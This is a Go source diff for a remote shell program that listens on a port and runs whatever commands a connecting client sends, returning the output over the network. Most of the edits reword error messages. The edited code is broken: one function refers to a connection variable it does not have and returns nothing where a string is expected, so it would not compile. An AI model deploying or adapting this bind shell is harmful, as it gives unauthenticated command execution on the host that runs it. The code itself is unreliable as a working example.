@@ -22,13 +22,18 @@ func handleError(err error) int {
 }
 
 func getUpdatedDirectory() string {
-	cwd, _ := os.Getwd()
+	cwd, err := os.Getwd()
+	if handleError(err) == 1 {
+		fmt.Fprintf(conn, "\n🔴 [ERROR] Unable to update directory on prompt: %v", err)
+		return
+	}
 	return cwd
 }
 
 func spawnShell(conn net.Conn) {
 	currentUser, err := user.Current()
 	if handleError(err) == 1 {
+		fmt.Fprintf(conn, "\n🔴 [ERROR] Unable to get current user: %v", err)
 		return
 	}
 	username := currentUser.Username
@@ -37,16 +42,17 @@ func spawnShell(conn net.Conn) {
 		return
 	}
 
-	fmt.Printf("\n🟢 Recieved connection from %v", conn.RemoteAddr().String())
+	fmt.Printf("\n🟢 [SUCCESS] Received connection from %v", conn.RemoteAddr().String())
 	conn.Write([]byte("🦊 Connection established!\n"))
 
 	for {
-		prompt := fmt.Sprintf("%s@%s:%s$ ", username, hostname, getUpdatedDirectory())
+		dir := getUpdatedDirectory()
+		prompt := fmt.Sprintf("%s@%s:%s$ ", username, hostname, dir)
 		conn.Write([]byte(prompt))
 		input := make([]byte, 1024)
 		n, err := conn.Read(input)
 		if handleError(err) == 1 {
-			fmt.Printf("\n🔴 Error reading input from client: %v", err)
+			fmt.Printf("\n🔴 [ERROR] Could not read input from client: %v", err)
 			return
 		}
 
@@ -54,7 +60,7 @@ func spawnShell(conn net.Conn) {
 		cmd.Stdout = conn
 		cmd.Stderr = conn
 		if err := cmd.Run(); handleError(err) == 1 {
-			fmt.Fprintf(conn, "\n🔴 Error executing command: %v", err)
+			fmt.Fprintf(conn, "\n🔴 [ERROR] Unable to execute commands: %v", err)
 		}
 	}
 }
@@ -62,7 +68,7 @@ func spawnShell(conn net.Conn) {
 func listen(PORT string, PROTOCOL string) {
 	ln, err := net.Listen(PROTOCOL, ":"+PORT)
 	if handleError(err) == 1 {
-		fmt.Printf("\n🔴 Error occurred with listening: %v", err)
+		fmt.Printf("\n🔴 [ERROR] Unable to listen on specified port: %v", err)
 		return
 	} else {
 		fmt.Printf("🟡 Listening on port %s (%s)", PORT, PROTOCOL)
@@ -71,7 +77,7 @@ func listen(PORT string, PROTOCOL string) {
 	for {
 		conn, err := ln.Accept()
 		if handleError(err) == 1 {
-			fmt.Printf("\n🔴 Error occured with connection attempt: %v", err)
+			fmt.Printf("\n🔴 [ERROR] : %v", err)
 		} else {
 			fmt.Printf("\n🟢 Connection established")
 		}
